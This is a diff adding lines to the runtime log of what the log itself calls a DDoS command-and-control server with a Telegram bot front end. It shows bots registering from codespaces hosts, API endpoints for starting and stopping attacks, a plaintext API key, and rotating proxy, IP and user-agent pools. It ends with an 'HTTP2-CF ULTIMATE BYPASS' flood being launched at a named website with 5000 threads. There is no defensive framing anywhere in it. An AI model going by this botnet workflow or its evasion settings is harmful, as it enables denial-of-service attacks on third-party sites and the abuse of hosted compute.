@@ -1,2 +1,163 @@
 [2025-11-22T12:14:43.645Z] [INFO] 🔄 Generating IP pool...
 [2025-11-22T12:14:43.673Z] [SUCCESS] ✅ Generated 10800 IPs for rotation
+[2025-11-22T18:15:33.301Z] [INFO] 🔄 Loading proxies (optimized mode)...
+[2025-11-22T18:15:33.311Z] [INFO] 🎯 Premium proxies loaded: 210 (optimized mode)
+[2025-11-22T18:15:33.312Z] [INFO] 💎 Your premium proxies: 195 | Manual proxies: 15
+[2025-11-22T18:15:33.313Z] [INFO] 🔄 Generating IP pool...
+[2025-11-22T18:15:33.335Z] [SUCCESS] ✅ Generated 10800 IPs for rotation
+[2025-11-22T18:15:33.336Z] [INFO] 🔄 Generating user agent pool...
+[2025-11-22T18:15:33.338Z] [INFO] ✅ Generated 57 user agents for rotation
+[2025-11-22T18:15:38.259Z] [SUCCESS] ✅ C2 Database initialized
+[2025-11-22T18:15:38.265Z] [SUCCESS] 
+╔═══════════════════════════════════════════════════════════╗
+[2025-11-22T18:15:38.265Z] [SUCCESS] ║          🎯 C2 SERVER STARTED SUCCESSFULLY 🎯            ║
+[2025-11-22T18:15:38.265Z] [SUCCESS] ╚═══════════════════════════════════════════════════════════╝
+[2025-11-22T18:15:38.266Z] [INFO] 
+📡 C2 Server running on: http://0.0.0.0:8080
+[2025-11-22T18:15:38.266Z] [INFO] 🌐 Dashboard: http://localhost:8080/dashboard
+[2025-11-22T18:15:38.266Z] [INFO] 🔌 WebSocket: ws://localhost:8080
+[2025-11-22T18:15:38.266Z] [INFO] 🔑 API Key: aryzz-c2-api-key-2024
+[2025-11-22T18:15:38.266Z] [INFO] 
+📚 API Endpoints:
+[2025-11-22T18:15:38.267Z] [INFO]    POST /api/auth/login - Login
+[2025-11-22T18:15:38.267Z] [INFO]    POST /api/bot/register - Register bot
+[2025-11-22T18:15:38.267Z] [INFO]    GET  /api/bots - List all bots
+[2025-11-22T18:15:38.268Z] [INFO]    POST /api/attack/start - Start attack
+[2025-11-22T18:15:38.268Z] [INFO]    POST /api/attack/:id/stop - Stop attack
+[2025-11-22T18:15:38.268Z] [INFO]    GET  /api/attacks - List attacks
+[2025-11-22T18:15:38.268Z] [INFO]    GET  /api/stats/overview - Get statistics
+[2025-11-22T18:15:38.269Z] [INFO] 
+🚀 Ready to accept commands!
+
+[2025-11-22T18:16:49.896Z] [INFO] 🤖 New bot registered: fd3bbd94-29d2-45ee-a2f8-b30f4829c388 (codespaces-cc3901)
+[2025-11-22T18:17:08.403Z] [INFO] 🤖 New bot registered: 5ce1493a-51df-4a31-bccf-1f5b35fcbce4 (codespaces-34d003)
+[2025-11-22T18:17:21.698Z] [INFO] 🤖 New bot registered: cd1539eb-d8eb-477d-a384-efc55879c2c7 (codespaces-622c18)
+[2025-11-22T18:17:37.471Z] [INFO] 🤖 New bot registered: 91047a31-6d61-47db-a699-95f346127140 (codespaces-635014)
+[2025-11-22T18:17:54.881Z] [INFO] 🔄 Loading proxies (optimized mode)...
+[2025-11-22T18:17:54.886Z] [INFO] 🎯 Premium proxies loaded: 210 (optimized mode)
+[2025-11-22T18:17:54.886Z] [INFO] 💎 Your premium proxies: 195 | Manual proxies: 15
+[2025-11-22T18:17:54.887Z] [INFO] 🔄 Generating IP pool...
+[2025-11-22T18:17:54.910Z] [SUCCESS] ✅ Generated 10800 IPs for rotation
+[2025-11-22T18:17:54.911Z] [INFO] 🔄 Generating user agent pool...
+[2025-11-22T18:17:54.913Z] [INFO] ✅ Generated 57 user agents for rotation
+[2025-11-22T18:17:59.399Z] [INFO] 🔧 Loading Telegram bot configuration...
+[2025-11-22T18:17:59.400Z] [INFO] 👤 Authorized Admin IDs: 8426540797
+[2025-11-22T18:17:59.560Z] [SUCCESS] 🔥 TELEGRAM BOT INLINE VERSION UDAH JALAN! 🔥
+[2025-11-22T18:17:59.560Z] [INFO] 👤 Admin IDs: 8426540797
+[2025-11-22T18:17:59.897Z] [ERROR] Unhandled Promise Rejection: request to https://api.telegram.org/bot7952535432:[REDACTED]/getMe failed, reason: 
+FetchError: request to https://api.telegram.org/bot7952535432:[REDACTED]/getMe failed, reason: 
+    at ClientRequest.<anonymous> (/home/arya/BOT-TELE-DOS/node_modules/node-fetch/lib/index.js:1501:11)
+    at ClientRequest.emit (node:events:524:28)
+    at emitErrorEvent (node:_http_client:101:11)
+    at TLSSocket.socketErrorListener (node:_http_client:504:5)
+    at TLSSocket.emit (node:events:524:28)
+    at emitErrorNT (node:internal/streams/destroy:169:8)
+    at emitErrorCloseNT (node:internal/streams/destroy:128:3)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
+[2025-11-22T18:20:23.853Z] [INFO] 🔄 Loading proxies (optimized mode)...
+[2025-11-22T18:20:23.857Z] [INFO] 🎯 Premium proxies loaded: 210 (optimized mode)
+[2025-11-22T18:20:23.858Z] [INFO] 💎 Your premium proxies: 195 | Manual proxies: 15
+[2025-11-22T18:20:23.858Z] [INFO] 🔄 Generating IP pool...
+[2025-11-22T18:20:23.876Z] [SUCCESS] ✅ Generated 10800 IPs for rotation
+[2025-11-22T18:20:23.877Z] [INFO] 🔄 Generating user agent pool...
+[2025-11-22T18:20:23.878Z] [INFO] ✅ Generated 57 user agents for rotation
+[2025-11-22T18:20:26.647Z] [INFO] 🔧 Loading Telegram bot configuration...
+[2025-11-22T18:20:26.648Z] [INFO] 👤 Authorized Admin IDs: 8426540797
+[2025-11-22T18:20:26.723Z] [SUCCESS] 🔥 TELEGRAM BOT INLINE VERSION UDAH JALAN! 🔥
+[2025-11-22T18:20:26.724Z] [INFO] 👤 Admin IDs: 8426540797
+[2025-11-22T18:20:52.085Z] [INFO] 🔥 Executing attack locally: https://aryapanel.xyz (HTTP2-CF)
+[2025-11-22T18:20:52.086Z] [INFO]    Threads: 5000, Duration: 400s, RPC: 10
+[2025-11-22T18:20:52.087Z] [INFO] 🔥 Executing HTTP2-CF attack on https://aryapanel.xyz
+[2025-11-22T18:20:52.088Z] [INFO]    Threads: 5000, Duration: 400s, RPC: 10
+[2025-11-22T18:20:52.088Z] [INFO]    Creating 15 attack instances (threads: 5000)
+[2025-11-22T18:20:52.104Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.105Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.105Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.106Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.106Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.106Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.115Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.115Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.116Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.116Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.117Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.117Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.127Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.128Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.128Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.128Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.129Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.129Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.136Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.136Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.136Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.136Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.137Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.137Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.142Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.142Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.142Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.143Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.143Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.143Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.146Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.146Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.146Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.147Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.147Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.147Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.152Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.153Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.153Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.154Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.155Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.156Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.162Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.162Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.163Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.163Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.163Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.163Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.173Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.173Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.173Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.174Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.174Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.174Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.181Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.181Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.182Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.182Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.182Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.182Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.189Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.190Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.190Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.190Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.190Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.190Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.202Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.202Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.203Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.203Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.203Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.204Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.213Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.213Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.214Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.214Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.214Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.214Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.246Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.246Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.247Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.247Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.247Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.247Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.249Z] [INFO] 🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized
+[2025-11-22T18:20:52.250Z] [INFO]    RPC Multiplier: 100x (5000 requests per batch)
+[2025-11-22T18:20:52.250Z] [INFO]    Generated 380 bypass tokens
+[2025-11-22T18:20:52.250Z] [INFO]    Proxy Pool: 210 proxies
+[2025-11-22T18:20:52.251Z] [INFO]    IP Pool: 10800 IPs
+[2025-11-22T18:20:52.251Z] [INFO]    UA Pool: 57 user agents
+[2025-11-22T18:20:52.251Z] [INFO]    Starting 15 attack instances...
